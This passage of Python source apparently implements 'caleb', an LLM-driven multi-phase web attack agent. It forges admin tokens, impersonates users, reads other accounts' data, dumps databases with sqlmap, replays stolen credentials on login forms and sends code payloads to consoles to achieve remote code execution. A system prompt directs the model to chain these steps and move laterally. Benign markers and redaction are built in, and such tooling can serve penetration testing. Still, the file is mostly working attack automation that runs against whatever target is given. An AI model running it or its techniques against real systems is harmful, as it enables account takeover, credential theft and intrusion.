            d = (_j(raw).get("data") or [{}])[0] or {}
            body = str(d.get("content") or "")
            if int(d.get("status") or 0) == 200 and re.search(r'"(email|passwordHash|password|address|card|phone)"\s*:\s*"[^"]{2,}"', body):
                store.add_findings([{
                    "severity": "high",
                    "title": f"Two-account BFLA: identity B reads identity A's object at {urlparse(det).path}",
                    "url": det,
                    "evidence": "a second account retrieved the first account's private record (cross-account IDOR)",
                    "phase": "P3-BFLA"}], "P3")
                break


def _chain_admin_walk(store: ArtifactStore, args) -> None:
    """With a forged/privileged identity, GET the admin/internal surface; a 200 that returns admin data or a
    secrets/user dump = broken function-level auth reachable only after the forge chain."""
    b = next((s for s in store.sessions if s.get("role") in ("admin", "impersonated")), None)
    if not b:
        return
    for u in store.match_endpoints("admin", "internal", "config", "export", "users", "recent", "stats", "metrics"):
        raw = bob._call(["http-request", u.split("?")[0]], b["headers"], args.debug)
        d = (_j(raw).get("data") or [{}])[0] or {}
        body = str(d.get("content") or "")
        if int(d.get("status") or 0) == 200 and (re.search(r'"(passwordHash|password|secret|jwt|token|apiKey)"', body, re.I)
                                                 or body.count('"email"') >= 2):
            store.add_findings([{
                "severity": "high",
                "title": f"Forged-admin reach: {urlparse(u).path} exposes admin/secret data",
                "url": u.split("?")[0],
                "evidence": "a self-forged admin identity reached a privileged surface (BFLA via weak-secret forge chain)",
                "phase": "P3-admin"}], "P3")


def _chain_cred_reuse_rce(store: ArtifactStore, sm: SessionManager, args) -> None:
    """SQLi/leak -> dumped creds -> discovered login form -> authenticated code console -> benign-marker RCE.
    Caleb's signature multi-stage chain (the lstalker reach). Deterministic; non-destructive (benign marker)."""
    # 1) ensure we have creds - if a SQLi is known but not dumped, dump it with sqlmap
    creds = _gather_creds(store)
    if not creds:
        _self_dump_sqli(store, args)
        creds = _gather_creds(store)
    if not creds:
        return
    # 2) find login forms among discovered pages
    forms = _find_login_forms(store, args)
    if not forms:
        return
    marker = random.randint(100000, 999999)
    expect = str(marker * 7)
    for page_url, form0, cookie0 in forms:
        action = _abs(page_url, form0.get("action") or "")
        ufield = next((k for k in form0["fields"] if k.lower() in _USER_FIELD), None)
        pfield = next((k for k in form0["fields"] if k.lower() in _PASS_FIELD), None)
        if not ufield or not pfield:
            continue
        for user, pw in creds:
            # re-fetch the form per attempt (anti-CSRF tokens rotate; fresh cookie pairs with fresh token)
            fresh = bob._call(["http-request", page_url], [], args.debug)
            fenv = _j(fresh)
            fbody = str(((fenv.get("data") or [{}])[0] or {}).get("content") or "")
            fform = next((f for f in _parse_forms(fbody) if f["has_pw"]), form0)
            cookie = _set_cookie(fenv) or cookie0
            fields = dict(fform["fields"]); fields[ufield] = user; fields[pfield] = pw
            st, body, newcookie = _form_post(action, fields, cookie, args)
            if st not in (200, 302) or re.search(r'type\s*=\s*["\']password["\']', body, re.I):
                continue
            authed_cookie = newcookie or cookie
            store.add_findings([{
                "severity": "high",
                "title": "Credential-reuse ATO: recovered creds log in to a gated panel",
                "url": action, "evidence": f"leaked/dumped creds authenticate to {urlparse(action).path}",
                "phase": "P3-chain"}], "P3")
            # look for a code console on the authed page -> benign-marker RCE
            pages = [body]
            rr = bob._call(["http-request", action, "-H", f"Cookie: {authed_cookie}"] if authed_cookie
                           else ["http-request", action], [], args.debug)
            pages.append(str(((_j(rr).get("data") or [{}])[0] or {}).get("content") or ""))
            console = None
            for pg in pages:
                for cf in _parse_forms(pg):
                    codef = next((k for k in cf["fields"] if k.lower() in _CODE_FIELD
                                  or any(c in k.lower() for c in _CODE_FIELD)), None)
                    if codef:
                        console = (_abs(action, cf.get("action") or ""), cf, codef)
                        break
                if console:
                    break
            if not console:
                return
            capp, cform, cfield = console
            for payload in (f"echo {marker}*7;", f"print({marker}*7)", f"<?php echo {marker}*7; ?>", f"{marker}*7"):
                cf_fields = dict(cform["fields"]); cf_fields[cfield] = payload
                st2, body2, _ = _form_post(capp, cf_fields, authed_cookie, args)
                if expect in body2:
                    store.add_findings([{
                        "severity": "high",
                        "title": "Authenticated code-console RCE (via SQLi -> creds -> login chain)",
                        "url": capp,
                        "evidence": f"chain reached an eval console; benign marker {marker}*7={expect} executed",
                        "phase": "P3-chain"}], "P3")
                    return
            return


def _self_dump_sqli(store: ArtifactStore, args) -> None:
    host = store.apex_host
    for f in store.findings:
        t = (str(f.get("title", "")) + " " + str(f.get("class", ""))).lower()
        u = str(f.get("url", ""))
        if ("sqli" in t or "sql injection" in t) and (urlparse(u).hostname or "").lower() == host:
            raw = bob._call(["sqlmap", u, "--opt-args", "--batch --dump --threads 4"], [], args.debug)
            if raw and "Dumped" in _cache_text(raw):
                store.cache[("sqlmap", u, "dump")] = raw
                store.add_lead("sqli-dump", urlparse(u).path, "P3")
                return


def _find_login_forms(store: ArtifactStore, args) -> list:
    scheme = urlparse(store.base_url).scheme or "https"
    host = store.apex_host
    cands, seen = [], set()
    for e in store.endpoints:
        p = urlparse(e["url"]).path.lower()
        pri = 0 if any(h in p for h in ("login", "admin", "panel", "signin", "auth", "session")) else 1
        cands.append((pri, e["url"].split("?")[0]))
    # also probe discovered directories for a nested panel (agnostic: from discovered dirs, not a hardcoded path)
    for lead in store.leads:
        if lead["kind"] == "backend-host":
            cands.append((0, f"{scheme}://{lead['detail'].split()[0]}/"))
    out = []
    for _pri, u in sorted(cands)[:25]:
        if u in seen:
            continue
        seen.add(u)
        raw = bob._call(["http-request", u], [], args.debug)
        env = _j(raw)
        body = str(((env.get("data") or [{}])[0] or {}).get("content") or "")
        for form in _parse_forms(body):
            if form["has_pw"]:
                out.append((u, form, _set_cookie(env)))
        if len(out) >= 4:
            break
    return out


def _form_post(url: str, fields: dict, cookie: str, args) -> tuple:
    from urllib.parse import urlencode
    argv = ["http-request", url, "-D", urlencode(fields), "-H", "Content-Type: application/x-www-form-urlencoded"]
    if cookie:
        argv += ["-H", f"Cookie: {cookie}"]
    raw = bob._call(argv, [], args.debug)
    env = _j(raw)
    d = (env.get("data") or [{}])[0] or {}
    return int(d.get("status") or 0), str(d.get("content") or ""), (_set_cookie(env) or cookie)


def phase_p4_review(store: ArtifactStore, sm: SessionManager, args) -> bool:
    """REVIEW / CONSOLIDATE: verify (re-fire) a sample of findings, surface UNPURSUED leads, and decide whether a
    new identity/lead warrants LOOPING BACK to P2/P3. Returns True if another round should run."""
    debug_print(f"caleb :: P4 review (round {store.rounds})")
    # surface unpursued leads as low-noise notes
    for lead in store.leads:
        if lead["kind"] in ("token", "secret", "sqli-dump", "backend-host") and not any(
                lead["detail"][:20].lower() in str(f.get("evidence", "")).lower() for f in store.findings):
            store.add_lead("unpursued", f"{lead['kind']}:{lead['detail']}", "P4")
    # loop-back decision: a new identity appeared this round, or a lead we haven't scanned under
    new_identity = any(not s.get("_scanned") for s in store.sessions)
    return new_identity and store.rounds < getattr(args, "max_rounds", 2)


# ==============================================================================================================
# helpers shared by phases
# ==============================================================================================================
def _endpoint_context(store: ArtifactStore) -> str:
    """A compact, agnostic inventory line so bob's LLM does not have to re-discover what caleb already mapped."""
    eps = [f"{e['method']} {urlparse(e['url']).path}" for e in store.endpoints[:60]]
    return "Known endpoints (already discovered - test these, don't re-crawl): " + "; ".join(dict.fromkeys(eps)) if eps else ""


def _scope_context(store: ArtifactStore, inv: str, sess: dict | None) -> str:
    parts = [f"SCOPE: {', '.join(store.hosts)} (the app's own UI + backend/API hosts)."]
    if inv:
        parts.append(inv)
    if sess:
        parts.append(f"You are AUTHENTICATED as identity {sess['label']} (role {sess.get('role')}); the auth "
                     "header is already injected on every request - now exercise the authenticated surface: "
                     "auth-gated IDOR/BOLA, excessive-data, mass-assignment, privilege-esc, business logic.")
    return "\n".join(parts)


def _tag_identity(findings: list, sess: dict) -> list:
    out = []
    for f in (findings or []):
        if isinstance(f, dict):
            f = dict(f)
            f["identity"] = sess["label"]
        out.append(f)
    return out


def _leads_from_findings(store: ArtifactStore, findings: list, phase: str) -> None:
    for f in (findings or []):
        t = str(f.get("title", "")).lower()
        if "sql" in t and "inject" in t:
            store.add_lead("sqli", str(f.get("url", "")), phase)
        if "secret" in t or "jwt" in t and "weak" in t:
            store.add_lead("forgeable", str(f.get("url", "")), phase)
        if "excessive data" in t or "user list" in t or "idor" in t or "bola" in t:
            store.add_lead("id-source", str(f.get("url", "")), phase)


# ==============================================================================================================
# AGENTIC DRIVER - caleb is AGENTIC-FIRST: an LLM drives the mission (which identity to acquire, what to chain,
# what lateral movement to try, when to reauth), calling caleb's capability-tools + bob's observation tools.
# The deterministic phase engine (above) runs AFTER as a BACKSTOP - the same agent+backstop split bob proved.
# ==============================================================================================================
_SYSTEM = (
    "You are CALEB, a MULTI-PHASE, MULTI-IDENTITY offensive agent. Where a single-pass scanner stops, you go "
    "further: you ACQUIRE identities, scan AUTHENTICATED, RE-AUTH when a session dies, and CHAIN findings across "
    "phases - the reach a one-shot scan structurally cannot get: auth-gated IDOR/BOLA, mass-assignment, business "
    "logic, TWO-ACCOUNT BFLA, LATERAL MOVEMENT, and multi-step chains (SQLi -> dumped creds -> hidden panel login "
    "-> RCE).\n\n"

    "YOU ARE THE DRIVER. Reason about what you OBSERVE and decide the next move - do not follow a fixed script. "
    "The capability-tools below are helpers that do the mechanical work; YOU decide when and how to use them, "
    "read what comes back, and adapt. Hardcoded lists inside the helpers are only starting hints - confirm the "
    "app's REAL behaviour by observation (what actually returns a token, another user's data, an error, a changed "
    "value) and decide from what you see.\n\n"

    "MISSION LOOP (adapt - not rigid):\n"
    "1. UNDERSTAND the surface: call `caleb_state` to see what recon already mapped (endpoints, hosts, tokens, "
    "leads). The API/backend often lives on a DIFFERENT host than the UI (an api./backend. subdomain OR a wholly "
    "different domain the app itself calls) - those backend hosts are IN SCOPE; third-party hosts (CDN/analytics/"
    "payment) are not. If the app is a heavy SPA, use `browser-crawl` to render it and capture the XHR/fetch API "
    "calls a static scrape misses.\n"
    "2. ACQUIRE IDENTITIES with `acquire_identity`. Prefer SELF-acquisition (it proves the vuln): register a fresh "
    "account; grab a token a debug/whoami endpoint hands out; FORGE an admin token from a weak/guessable signing "
    "secret or alg:none; impersonate via a login-as endpoint that lacks an admin check. Build at least TWO "
    "labelled identities (A = a normal user, B = admin or a second account) - you need two to prove cross-account "
    "BFLA. Use handed-in --creds only to seed/validate.\n"
    "3. AUTHENTICATED DEEP SCAN with `authed_scan(label)` for each identity, on each host - now auth-gated "
    "IDOR/BOLA, excessive-data, mass-assignment, privesc, and business logic land.\n"
    "4. CHAIN + LATERAL MOVEMENT - this is your whole reason to exist. `cross_account_bfla` (read identity A's "
    "objects as identity B); `lateral_move` (take ANY credential/token/cookie you hold - from a leak, a SQLi dump, "
    "one identity, one host - and REUSE it against every OTHER login / gated endpoint / host: creds->login, "
    "token->replay, admin-cred->panel); `run_rce_chain` (SQLi -> dump creds -> discovered login -> code console -> "
    "benign-marker RCE). Compose primitives into 2-3 hop paths (leak -> forge -> victim email -> reset -> ATO). "
    "Never leave a recovered credential, token, or leaked id unused.\n"
    "5. RE-AUTH: if a scan shows 401/403/expired mid-way, call `reauth(label)` (refresh token -> stored creds -> "
    "re-forge) and continue.\n"
    "6. REPORT each confirmed issue with `report_finding` (severity/title/url/evidence, secrets REDACTED). A "
    "finding is confirmed by BEHAVIOUR - the endpoint actually returned another user's data / a token / executed "
    "your benign marker. When every identity is scanned and every chain/lead is dead-ended or proven, reply with "
    "NO tool call and a one-line 'DONE: <summary>'.\n\n"

    "You may OBSERVE freely with the read tools (http-request, browser-crawl, katana-crawl, graphql-detect, "
    "sqlmap, fuzz, swagger-specs, scan-secrets, js-endpoints, graphql-audit) to verify a lead before you act. "
    "Never PUT/PATCH/DELETE destructively; stay on the app's own hosts; redact secret values.")

_OBSERVE_TOOLS = ("http-request", "browser-crawl", "katana-crawl", "graphql-detect", "graphql-audit",
                  "sqlmap", "fuzz", "swagger-specs", "swagger-endpoints", "scan-secrets", "js-endpoints",
                  "path-bust")


def _custom_tool_defs() -> list:
    S = lambda **p: {"type": "object", "properties": p, "additionalProperties": False}
    s = lambda d: {"type": "string", "description": d}
    return [
        {"name": "caleb_state", "description": "Summary of the artifact store: hosts, endpoint sample, identities "
         "(role only - tokens redacted), leads, secrets (redacted), current findings count.",
         "schema": S()},
        {"name": "acquire_identity", "description": "Acquire a labelled identity. method: register (fresh "
         "account) | login (needs creds 'user:pass') | forge (admin via weak-secret/alg:none) | debug (grab a "
         "token a debug endpoint hands out) | login_as (impersonate target_id). Returns label+role (token kept "
         "private).", "schema": {"type": "object", "properties": {
            "method": {"type": "string", "enum": ["register", "login", "forge", "debug", "login_as"]},
            "label": {"type": "string", "description": "A or B"},
            "creds": s("user:pass for method=login"), "target_id": s("user id for method=login_as")},
            "required": ["method"], "additionalProperties": False}},
        {"name": "authed_scan", "description": "Run bob's full check battery WITH an identity injected, across "
         "every in-scope host (auth-gated IDOR/BOLA, mass-assign, biz-logic). Returns new findings.",
         "schema": {"type": "object", "properties": {"label": s("identity label, e.g. A")},
                    "required": ["label"], "additionalProperties": False}},
        {"name": "cross_account_bfla", "description": "Two-account BFLA: read identity A's object-ids AS identity "
         "B (needs both A and B acquired). Returns any cross-account reads.", "schema": S()},
        {"name": "lateral_move", "description": "Lateral movement: reuse a credential/token you hold against "
         "other logins/gated endpoints/hosts. Give either credential 'user:pass' OR from_label (reuse that "
         "identity's token); optional target (url/host) to focus, else caleb tries all discovered logins/hosts.",
         "schema": {"type": "object", "properties": {"credential": s("user:pass to reuse"),
            "from_label": s("reuse this identity's token"), "target": s("optional url/host to focus on")},
            "additionalProperties": False}},
        {"name": "run_rce_chain", "description": "Run the SQLi->dumped-creds->discovered-login->code-console-> "
         "benign-marker-RCE chain (self-dumps a known SQLi if needed).", "schema": S()},
        {"name": "reauth", "description": "Re-authenticate an identity whose session expired (refresh token -> "
         "stored creds -> re-forge).", "schema": {"type": "object", "properties": {"label": s("identity label")},
            "required": ["label"], "additionalProperties": False}},
        {"name": "report_finding", "description": "Record a CONFIRMED finding (redact secret values).",
         "schema": {"type": "object", "properties": {
            "severity": {"type": "string", "enum": ["critical", "high", "medium", "low", "suggestion"]},
            "title": s("short title"), "url": s("location"), "evidence": s("<=140 chars, redacted")},
            "required": ["severity", "title"], "additionalProperties": False}},
    ]


def _dispatch_tool(name, tool_args, store, sm, args) -> str:
    """Execute one tool call and return a short text result for the LLM (bodies capped, secrets redacted)."""
    from ..tools import toolschema
    if name in _OBSERVE_TOOLS:
        argv = toolschema.to_argv(name, tool_args)
        raw = bob._call(argv, [], args.debug)
        # ingest any endpoints/tokens the observation revealed
        _ingest_observation(store, name, argv, raw)
        return _cap(raw)
    if name == "caleb_state":
        return _state_summary(store)
    if name == "acquire_identity":
        return _tool_acquire(store, sm, tool_args, args)
    if name == "authed_scan":
        label = tool_args.get("label", "A")
        sess = next((s for s in store.sessions if s["label"] == label), None)
        if not sess:
            return f"no identity {label}; acquire it first"
        total = 0
        for host in store.hosts:
            f = _bob_backstops(f"{urlparse(store.base_url).scheme}://{host}", sess["headers"], store.cache, args)
            total += store.add_findings(_tag_identity(f, sess), f"P2-{label}")
            _leads_from_findings(store, f, "P2")
        sess["_scanned"] = True
        return f"authed_scan as {label}: +{total} new findings across {len(store.hosts)} host(s)"
    if name == "cross_account_bfla":
        before = len(store.findings); _chain_two_account_bfla(store, args); _chain_admin_walk(store, args)
        return f"cross-account/admin walk: +{len(store.findings) - before} findings"
    if name == "lateral_move":
        return _tool_lateral(store, sm, tool_args, args)
    if name == "run_rce_chain":
        before = len(store.findings); _chain_cred_reuse_rce(store, sm, args)
        return f"rce chain: +{len(store.findings) - before} findings"
    if name == "reauth":
        sess = next((s for s in store.sessions if s["label"] == tool_args.get("label")), None)
        return ("reauth ok" if (sess and sm.reauth(sess)) else "reauth failed / no such identity")
    if name == "report_finding":
        store.add_findings([{"severity": tool_args.get("severity", "medium"), "title": tool_args.get("title", ""),
                             "url": tool_args.get("url", ""), "evidence": tool_args.get("evidence", ""),
                             "phase": "agent"}], "agent")
        return "recorded"
    return f"unknown tool {name}"


def _tool_acquire(store, sm, ta, args) -> str:
    m, label = ta.get("method"), ta.get("label", "A")
    sess = None
    if m == "register":
        sess = sm.acquire_register(label)
    elif m == "login" and ta.get("creds") and ":" in ta["creds"]:
        u, p = ta["creds"].split(":", 1); sess = sm.acquire_login(u, p, label)
    elif m == "forge":
        sess = sm.acquire_forge(label)
    elif m == "debug":
        sess = sm.acquire_debug_grab(label)
    elif m == "login_as":
        sess = sm.acquire_login_as(ta.get("target_id") or (store.ids_seen[0] if store.ids_seen else "1"), label)
    if sess:
        return f"identity {sess['label']} acquired: role={sess.get('role')} via {sess.get('source')} (token redacted)"
    return f"acquire ({m}) failed - try another method or observe the auth surface first"


def _tool_lateral(store, sm, ta, args) -> str:
    """Lateral movement: reuse a held credential/token against other logins / gated endpoints / hosts."""
    hits = 0
    creds = []
    if ta.get("credential") and ":" in ta["credential"]:
        creds = [tuple(ta["credential"].split(":", 1))]
    else:
        creds = _gather_creds(store)
    # (a) credential reuse against discovered logins (any host)
    for u, p in creds[:8]:
        new = sm.acquire_login(u, p, label="L")
        if new:
            hits += 1
            store.add_findings([{"severity": "high", "title": "Lateral movement: recovered credential logs in",
                                 "url": new.get("source", ""), "evidence": "a credential from one source authenticates elsewhere",
                                 "phase": "P3-lateral"}], "P3")
            break
    # (b) token replay: reuse an identity's bearer against gated endpoints on all hosts
    src = ta.get("from_label")
    tok_headers = None
    if src:
        s = next((x for x in store.sessions if x["label"] == src), None)
        tok_headers = s["headers"] if s else None
    for host in store.hosts:
        base = f"{urlparse(store.base_url).scheme}://{host}"
        for u in store.match_endpoints("admin", "me", "account", "users", "internal", "config"):
            if (urlparse(u).hostname or "").lower() != host and host not in u:
                pass
            raw = bob._call(["http-request", u.split("?")[0]], tok_headers or [], args.debug)
            d = (_j(raw).get("data") or [{}])[0] or {}
            if int(d.get("status") or 0) == 200 and re.search(r'"(email|passwordHash|role|token)"', str(d.get("content") or ""), re.I):
                store.add_findings([{"severity": "high", "title": f"Lateral token replay reaches {urlparse(u).path}",
                                     "url": u.split("?")[0], "evidence": "a held token unlocked a gated endpoint on another host/path",
                                     "phase": "P3-lateral"}], "P3")
                hits += 1
                break
    return f"lateral_move: {hits} reuse hit(s)"


def _state_summary(store) -> str:
    eps = "; ".join(dict.fromkeys(f"{e['method']} {urlparse(e['url']).path}" for e in store.endpoints[:50]))
    ids = ", ".join(f"{s['label']}={s.get('role')}({s.get('source')})" for s in store.sessions) or "none yet"
    leads = "; ".join(f"{l['kind']}:{l['detail'][:40]}" for l in store.leads[:15])
    secrets = "; ".join(f"{s['kind']}@{s['location']}" for s in store.secrets) or "none"
    return (f"hosts: {', '.join(store.hosts)}\nidentities: {ids}\nfindings so far: {len(store.findings)}\n"
            f"secrets(redacted): {secrets}\nleads: {leads}\nendpoints({len(store.endpoints)}): {eps}")


def _ingest_observation(store, name, argv, raw) -> None:
    """Fold a read tool's output back into the store (endpoints, tokens, ids) so the state stays current."""
    url = next((a for a in argv[1:] if isinstance(a, str) and a.startswith("http")), "")
    if url:
        store.cache[(name, url)] = raw
    try:
        for d in (_j(raw).get("data") or []):
            if isinstance(d, dict) and d.get("url"):
                store.add_endpoint(d["url"], d.get("method", "GET"), name)
            elif isinstance(d, str) and d.startswith("http"):
                store.add_endpoint(d, "GET", name)
    except Exception:  # noqa: BLE001
        pass
    store.note_ids(re.findall(r'"id"\s*:\s*"?([0-9a-fA-F][0-9a-fA-F-]{2,39}|\d{1,9})"?', _cache_text(raw))[:10])


def _cap(raw: str, n: int = 6000) -> str:
    raw = raw or ""
    return raw if len(raw) <= n else raw[:n] + "\n...[capped]"


def _agentic_driver(store: ArtifactStore, sm: SessionManager, args) -> None:
    """The LLM mission loop. Falls through silently if no provider - the deterministic backstop still runs."""
    from ..tools import toolschema
    provider_cls = PROVIDERS[args.provider]
    key = args.api_key or os.environ.get(provider_cls.env)
    if not key:
        debug_print("caleb :: no LLM key - skipping agentic driver, running deterministic backstop only")
        return
    provider = provider_cls(args.model or provider_cls.default_model, key, base_url=args.base_url)
    tools_spec = toolschema.native_tools(list(_OBSERVE_TOOLS)) + _custom_tool_defs()
    user = (f"TARGET: {store.base_url}\nApex host: {store.apex_host}. Recon already mapped "
            f"{len(store.endpoints)} endpoints across hosts {store.hosts}. Call caleb_state first, then drive the "
            "mission: acquire identities, scan authenticated, chain + lateral-move, report. Begin.")
    messages = [{"role": "user", "content": user}]
    known = set(_OBSERVE_TOOLS) | {t["name"] for t in _custom_tool_defs()}
    for step in range(max(1, args.max_steps)):
        try:
            resp = provider.send(_SYSTEM, messages, tools_spec)
        except Exception as exc:  # noqa: BLE001
            debug_print(f"caleb :: provider error: {exc}")
            break
        text, calls = provider.parse(resp)
        messages += provider.assistant_msg(resp)
        if text.strip():
            debug_print("caleb> " + " ".join(text.split())[:200])
        if not calls:
            if text.strip():
                break
            messages.append({"role": "user", "content": "Use the tools to act - start with caleb_state."})
            continue
        results = []
        for c in calls:
            if c["name"] not in known:
                results.append({"id": c["id"], "output": f"unknown tool {c['name']}"})
                continue
            try:
                out = _dispatch_tool(c["name"], c.get("args") or {}, store, sm, args)
            except Exception as exc:  # noqa: BLE001
                out = f"{c['name']} error: {exc}"
            results.append({"id": c["id"], "output": _cap(str(out))})
        messages += provider.tool_results(results)


# ==============================================================================================================
# ORCHESTRATOR + report
# ==============================================================================================================
def _run_caleb(store: ArtifactStore, args) -> None:
    sm = SessionManager(store, args)
    phase_p0_recon(store, args)                       # observe + seed + one bob baseline
    store.rounds += 1
    _agentic_driver(store, sm, args)                  # AGENTIC-FIRST: the LLM drives the mission
    # DETERMINISTIC BACKSTOP: guarantee the mechanical coverage the agent may have skipped (same split as bob).
    phase_p1_identity(store, sm, args)
    phase_p2_authed(store, sm, args, only_new=True)
    phase_p3_chain(store, sm, args)
    store.persist()
    # bounded loop-back if a new identity/lead appeared
    while phase_p4_review(store, sm, args):
        store.rounds += 1
        phase_p2_authed(store, sm, args, only_new=True)
        phase_p3_chain(store, sm, args)
        store.persist()
    store.persist()


_SEV_RANK = {"critical": 0, "high": 1, "medium": 2, "low": 3, "suggestion": 4, "info": 5}


def _render_report(store: ArtifactStore) -> str:
    srt = sorted(store.findings, key=lambda f: _SEV_RANK.get(str(f.get("severity", "info")).lower(), 9))
    highs = [f for f in srt if str(f.get("severity", "")).lower() in ("critical", "high")]
    ident_str = ", ".join(f"{s['label']}:{s.get('role')}" for s in store.sessions) or "none"
    out = [f"## Caleb - multi-phase scan: {store.base_url}", "",
           f"**Hosts:** {', '.join(store.hosts)}  |  **Identities:** {ident_str}"
           f"  |  **Rounds:** {store.rounds}  |  **Findings:** {len(store.findings)}"]
    phases = {}
    for f in srt:
        phases.setdefault(str(f.get("phase", "?")), []).append(f)
    if highs:
        out += ["", "### High-impact"]
        out += [f"- **[{str(f.get('severity','high')).title()}]** {str(f.get('title','')).strip()} - "
                f"`{f.get('url','')}`" + (f" ({f.get('identity')})" if f.get("identity") else "") for f in highs]
    out += ["", "### All findings by phase"]
    for ph in sorted(phases):
        out += [f"", f"**{ph}** ({len(phases[ph])}):"]
        out += [f"  - [{str(f.get('severity','info')).title()}] {str(f.get('title','')).strip()} - "
                f"`{f.get('url','')}`" for f in phases[ph]]
    caleb_only = [f for f in store.findings if str(f.get("phase", "")).startswith("P3")]
    if caleb_only:
        out += ["", "### Reached only by caleb (multi-step / cross-identity - beyond bob's single pass)"]
        out += [f"  - {str(f.get('title','')).strip()} - `{f.get('url','')}`" for f in caleb_only]
    if store.leads:
        unpursued = [l for l in store.leads if l["kind"] == "unpursued"]
        if unpursued:
            out += ["", "### Unpursued leads"] + [f"  - {l['detail']}" for l in unpursued]
    out += ["", "**NOT covered** (route elsewhere): OAuth/MFA/CAPTCHA browser login, second-viewer stored-XSS, "
            "true infra (ports, subdomain takeover, TLS). SSRF / open-redirect deprioritized."]
    return "\n".join(out)


# ==============================================================================================================
# CLI
# ==============================================================================================================
def add_arguments(parser) -> None:
    parser.add_argument("target", help="Target URL / host (the app root; caleb also finds its backend/API hosts)")
    parser.add_argument("--creds", default=None, metavar="USER:PASS",
                        help="Seed credentials for identity A (self-acquisition is preferred; used to validate authed phases)")
    parser.add_argument("--creds-b", dest="creds_b", default=None, metavar="USER:PASS",
                        help="Seed credentials for identity B (second account, for cross-account BFLA)")
    parser.add_argument("--out-dir", dest="out_dir", default=None, metavar="DIR",
                        help="Directory for the artifact store snapshot (default opt/caleb_artifacts/)")
    parser.add_argument("--max-rounds", dest="max_rounds", type=int, default=2,
                        help="Max review->P2/P3 loop-backs when new identities/leads appear (default 2)")
    add_agent_args(parser, max_steps=500)


def run(args) -> int:
    target = (args.target or "").strip()
    if not target:
        output_result([], args.output, "a target is required")
        return 2
    base_url = target if target.startswith(("http://", "https://")) else "https://" + target
    provider_cls = PROVIDERS[args.provider]
    key = args.api_key or os.environ.get(provider_cls.env)
    if not key:
        sys.stderr.write(f"caleb: an LLM is required - provide --api-key or set {provider_cls.env}\n")
        return 2

    store = ArtifactStore(base_url, out_dir=args.out_dir)
    debug_print(f"caleb :: starting multi-phase scan of {base_url}")
    try:
        _run_caleb(store, args)
    except Exception as exc:  # noqa: BLE001
        sys.stderr.write(f"caleb: run error: {exc}\n")

    report = _render_report(store)
    if getattr(args, "report", None):
        try:
            with open(args.report, "w", encoding="utf-8") as fh:
                fh.write(report + "\n")
        except OSError as exc:
            sys.stderr.write(f"caleb: could not write report to {args.report}: {exc}\n")
    debug_print("\n" + report + "\n")

    extra = {"target": base_url, "report": report, "hosts": store.hosts,
             "identities": [{"label": s["label"], "role": s.get("role"), "source": s.get("source")} for s in store.sessions],
             "rounds": store.rounds}
    if getattr(args, "table", False) and not args.output:
        sys.stdout.write(report + "\n")
    else:
        output_result(store.findings, args.output, extra=extra)
    return 0
